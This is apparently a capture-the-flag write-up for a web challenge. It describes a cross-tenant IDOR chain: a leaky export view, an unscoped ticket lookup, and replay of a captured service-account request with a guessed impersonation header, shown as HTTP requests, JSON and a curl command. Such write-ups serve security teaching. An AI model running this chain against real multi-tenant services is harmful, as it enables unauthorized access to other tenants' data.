# No Humans Were Logged In — Web (364 pts)

> ContinuityDesk. The tenant audit says no administrator entered, but support replay counters
> disagree. Investigate the missing incident token.
> `http://45.77.247.35:22009`

**Flag:** `CYBLTZ2026{s3rv1c3_4cc0un75_l34v3_hum4n_5h4D0w5}`

A multi-tenant IDOR chain: a redacted "export" view leaks foreign-tenant correlation fields, a
per-reference lookup ignores tenancy, and a support "snapshot" preserves the exact
service-account request needed to replay a privileged read.

## Entry

The analyst login is a demo account pre-filled in the form (`analyst@harbor.local` /
`harbor-view`). It sets a Flask-signed session (`{"user_id":1}`) and lands on a dashboard that
advertises two APIs — `/api/audit/recent`, `/api/tickets` — and notes an "export" view that
"returns metadata about other available views."

## 1. Export view leaks foreign rows

The tenant view hides foreign rows; the export view keeps their **correlation fields**:

```
GET /api/audit/recent?view=export
```

Among the harbor rows sit three foreign tenants. Two carry `tr_decoy*` trace IDs; one does not:

```json
{"event":"incident_replay","ref":"MER-2026-9F2C7A84E6B1","tenant_slug":"merlion",
 "trace_id":"tr_6f4d220901db85c42a73",
 "details":"incident=MW-9001 actor=svc_snapshot human_admin=false replay=service_context"}
```

`actor=svc_snapshot human_admin=false` is the "no human logged in" the title promises.

## 2. Reference lookup is not tenant-scoped

`/api/tickets` only lists harbor tickets, but exposes a by-reference template
`/api/tickets/ref/{ref}` that happily returns the Merlion ticket:

```
GET /api/tickets/ref/MER-2026-9F2C7A84E6B1
severity: critical, status: locked
support.snapshot_id: snap-7c01b54e9af87d2036ea
support.kid:         k_1d8bc754e63f20a9476bd38c5e0f12a4
support.manifest:    /api/snapshots/snap-7c01b54e9af87d2036ea/manifest?kid=...
```

## 3. The snapshot keeps the privileged request

The capture manifest splits into three fragments; the hint is
*"presentation fragments mask human handles; request routing remains intact."* The `request`
fragment is the captured service-account call with its routing headers still populated:

```json
{"method":"GET","path":"/api/incidents/by-code/MW-9001",
 "headers":[
   {"name":"X-Support-Replay","value":"srp_v3_d2f0943eaa52c7b910864fd09e83b6ac"},
   {"name":"X-Replay-Trace","value":"tr_6f4d220901db85c42a73"},
   {"name":"X-Tenant-Slug","value":"merlion"},
   {"masked":true,"name":"X-Act-As","value":"i***"}]}
```

Only `X-Act-As` is masked — the "missing incident token" is the human handle behind `i***`.

## 4. Unmask the handle from the public mirror

`/company` is Merlion's public assurance mirror. It lists staff **and** documents the handle
convention: *first initial + family name, lowercase, punctuation/spaces stripped* (`Dev Patel →
dpatel`). The privileged approver is **Iris Tan, Head of Trust and Safety** → `itan`.

## 5. Replay

Reissue the captured request with the handle filled in:

```bash
curl -s http://45.77.247.35:22009/api/incidents/by-code/MW-9001 \
  -b 'session=<analyst cookie>' \
  -H 'X-Support-Replay: srp_v3_d2f0943eaa52c7b910864fd09e83b6ac' \
  -H 'X-Replay-Trace: tr_6f4d220901db85c42a73' \
  -H 'X-Tenant-Slug: merlion' \
  -H 'X-Act-As: itan'
```
```json
{"actor":"itan","human_admin_login":false,"public_code":"MW-9001","tenant":"merlion",
 "incident_token":"CYBLTZ2026{s3rv1c3_4cc0un75_l34v3_hum4n_5h4D0w5}",
 "title":"Merlion Wing Privileged Incident"}
```

`iris` / `i.tan` / `iristan` are all rejected — the normalization is exactly the public
convention.

**Takeaway:** redaction that preserves "correlation fields" is a cross-tenant oracle; a
`by-ref` lookup must enforce the same tenancy as the list it came from; and a request-capture
feature that keeps auth-relevant headers is a replay primitive, not a debugging aid.
